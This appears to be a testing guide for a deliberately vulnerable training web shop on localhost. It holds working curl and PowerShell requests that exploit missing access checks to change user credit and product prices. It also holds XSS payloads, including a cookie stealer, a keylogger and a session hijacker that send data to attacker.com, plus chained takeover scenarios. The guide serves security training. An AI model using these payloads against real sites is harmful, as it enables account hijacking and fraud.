# 🧪 Version 1.5 - New Features Testing Guide

## Fixed Issues Testing

### 1️⃣ Admin Role Preservation During Re-registration

**Issue Fixed:** Re-registering admin username now preserves admin role

**Test:**
```bash
# 1. Register a regular user
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'

# 2. Try to re-register as admin
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"newpassword"}'

# Response should include: "role": "admin"

# 3. Login with new password
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"newpassword"}' \
  -c cookies.txt

# 4. Check role - should still be admin
curl http://localhost:3001/api/users/1 -b cookies.txt

# Response: {"id":1,"username":"admin","role":"admin",...}
```

**Vulnerability:**
- Username overwrite still works (intentional)
- But admin role is preserved (prevents privilege escalation)

---

### 2️⃣ PUT/PATCH Methods for API Editing

**Issue Fixed:** PUT and PATCH methods now supported for updating resources

#### Test User Updates (IDOR Vulnerability)

**Update User Credit via PUT:**
```bash
# Login first
curl -X POST http://localhost:3001/api/auth/login \
  -d '{"username":"admin","password":"admin"}' \
  -c cookies.txt

# Update user 2's credit to 999999
curl -X PUT http://localhost:3001/api/users/2 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"credit":999999}'

# Response: {"success":true,"changes":1}

# Verify the change
curl http://localhost:3001/api/users/2 -b cookies.txt
# Response: {"id":2,...,"credit":999999}
```

**Update User Email via PATCH:**
```bash
curl -X PATCH http://localhost:3001/api/users/2 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"email":"hacked@example.com"}'

# Response: {"success":true,"changes":1}
```

**Update Multiple Fields:**
```bash
curl -X PUT http://localhost:3001/api/users/2 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"credit":999999,"email":"rich@example.com","address":"123 Hacker St"}'
```

#### Test Product Updates (No Admin Check!)

**Update Product Price via PUT:**
```bash
# Login as regular user
curl -X POST http://localhost:3001/api/auth/login \
  -d '{"username":"testuser","password":"testpass"}' \
  -c cookies.txt

# VULN: Regular user can update product prices!
curl -X PUT http://localhost:3001/api/products/1 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"price":0.01}'

# Product price changed to $0.01!
```

**Update Product Stock via PATCH:**
```bash
# Give yourself unlimited stock
curl -X PATCH http://localhost:3001/api/products/1 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"stock":999999}'

# Response: {"success":true,"changes":1}
```

**Complete Product Manipulation:**
```bash
curl -X PUT http://localhost:3001/api/products/1 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "name":"Free Laptop",
    "description":"Hacked by me",
    "price":0.01,
    "stock":999999
  }'
```

**Using PowerShell (Windows):**
```powershell
# Login
$login = Invoke-RestMethod -Uri "http://localhost:3001/api/auth/login" `
  -Method POST -Body (@{username="admin";password="admin"} | ConvertTo-Json) `
  -ContentType "application/json" -SessionVariable session

# Update user credit
Invoke-RestMethod -Uri "http://localhost:3001/api/users/2" `
  -Method PUT `
  -Body (@{credit=999999} | ConvertTo-Json) `
  -ContentType "application/json" `
  -WebSession $session

# Update product price
Invoke-RestMethod -Uri "http://localhost:3001/api/products/1" `
  -Method PATCH `
  -Body (@{price=0.01} | ConvertTo-Json) `
  -ContentType "application/json" `
  -WebSession $session
```

---

### 3️⃣ XSS in Admin Feedback

**Issue Fixed:** XSS now properly executes in admin feedback page

#### Test XSS Payloads

**Basic Alert XSS:**
```bash
# Submit feedback with XSS
curl -X POST http://localhost:3001/api/feedback \
  -F "userId=2" \
  -F "message=<script>alert('XSS Vulnerability!')</script>"

# Login as admin and view feedbacks
# Alert should popup!
```

**Via Browser (Easier):**
1. Login as regular user
2. Go to Feedback page
3. Enter: `<script>alert('XSS!')</script>`
4. Submit
5. Logout
6. Login as admin (admin/admin)
7. Click "📝 View Feedbacks"
8. **Alert pops up!**

**Advanced XSS Payloads:**

**Cookie Stealer:**
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
alert('Cookies stolen: ' + document.cookie);
</script>
```

**DOM Manipulation:**
```html
<script>
document.querySelector('h2').textContent = 'HACKED BY XSS';
document.body.style.background = 'red';
</script>
```

**Keylogger:**
```html
<script>
document.addEventListener('keypress', function(e) {
  console.log('Key pressed: ' + e.key);
  fetch('http://attacker.com/log?key=' + e.key);
});
</script>
```

**Session Hijacking:**
```html
<script>
var token = document.cookie.match(/authToken=([^;]+)/)[1];
var userId = document.cookie.match(/userId=([^;]+)/)[1];
fetch('http://attacker.com/hijack?token=' + token + '&user=' + userId);
</script>
```

**Image-Based XSS (Alternative):**
```html
<img src=x onerror="alert('XSS via img tag')">
```

**SVG XSS:**
```html
<svg onload="alert('XSS via SVG')">
```

**Iframe Injection:**
```html
<iframe src="javascript:alert('XSS via iframe')"></iframe>
```

**Event Handler XSS:**
```html
<div onmouseover="alert('XSS on mouseover')">Hover over me</div>
```

**Testing in Practice:**
1. Login as user
2. Submit feedback: `<img src=x onerror="alert('Admin Cookie: ' + document.cookie)">`
3. Login as admin
4. View feedbacks
5. Alert shows admin's cookie
6. Cookie can be used to hijack admin session!

---

## 🎯 Attack Scenarios

### Scenario 1: Privilege Escalation via PUT/PATCH

```bash
# 1. Register as regular user
curl -X POST http://localhost:3001/api/auth/register \
  -d '{"username":"attacker","password":"attacker123"}' -c cookies.txt

# 2. Login
curl -X POST http://localhost:3001/api/auth/login \
  -d '{"username":"attacker","password":"attacker123"}' -c cookies.txt

# 3. Give yourself unlimited credit
curl -X PUT http://localhost:3001/api/users/2 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"credit":999999}'

# 4. Set all products to $0.01
for i in {1..10}; do
  curl -X PATCH http://localhost:3001/api/products/$i \
    -H "Content-Type: application/json" \
    -b cookies.txt \
    -d '{"price":0.01,"stock":999999}'
done

# 5. Buy everything for pennies!
```

### Scenario 2: XSS to Admin Session Hijacking

```bash
# 1. Submit malicious feedback as regular user
curl -X POST http://localhost:3001/api/feedback \
  -F "userId=2" \
  -F "message=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"

# 2. Wait for admin to view feedbacks
# 3. Admin's session cookie sent to attacker.com
# 4. Use stolen cookie to login as admin
```

### Scenario 3: Complete Shop Takeover

```bash
# 1. Login as any user
# 2. Use PUT to change all products to free
# 3. Use PUT to give yourself infinite credit
# 4. Use XSS to steal admin session
# 5. Use admin session to access admin panel
# 6. Complete control of the shop!
```

---

## ✅ Verification Checklist

### Admin Role Preservation
- [ ] Re-register admin with new password
- [ ] New registration has "role": "admin" in response
- [ ] Login with new password works
- [ ] Admin role preserved (check /api/users/1)

### PUT/PATCH Methods
- [ ] PUT request updates user credit
- [ ] PATCH request updates user email
- [ ] PUT request changes product price
- [ ] PATCH request changes product stock
- [ ] Regular user can modify products (no admin check)
- [ ] Can update any user's data (IDOR)

### XSS in Admin Feedback
- [ ] Submit `<script>alert('XSS')</script>` as feedback
- [ ] Login as admin
- [ ] View feedbacks page
- [ ] Alert popup appears
- [ ] XSS warning message visible on page
- [ ] Try other XSS payloads (img, svg, iframe)

---

## 🔧 Testing Tools

**Burp Suite:**
- Intercept requests
- Change GET to PUT/PATCH
- Modify request bodies
- Test various XSS payloads

**curl:**
- Quick command-line testing
- Scriptable for automation
- Easy cookie management

**Browser DevTools:**
- Test XSS directly
- Monitor network requests
- Check cookie values

**Postman:**
- GUI for API testing
- Easy method switching (GET/PUT/PATCH)
- Request collections

---

## 📝 Notes

**Why PUT/PATCH Vulnerabilities Matter:**
- Many developers forget to protect these methods
- Automated security scanners often miss them
- Can lead to complete data manipulation
- IDOR + PUT/PATCH = Full account takeover

**Why XSS in Admin Panel is Critical:**
- Admin has elevated privileges
- Can lead to complete site compromise
- Session hijacking gives attacker admin access
- Can inject persistent backdoors

**Real-World Impact:**
- PUT/PATCH vulnerabilities found in major APIs
- XSS in admin panels = game over
- Combined with IDOR = data breach
- All three together = critical severity

---

**Happy (Ethical) Hacking! 🎯**
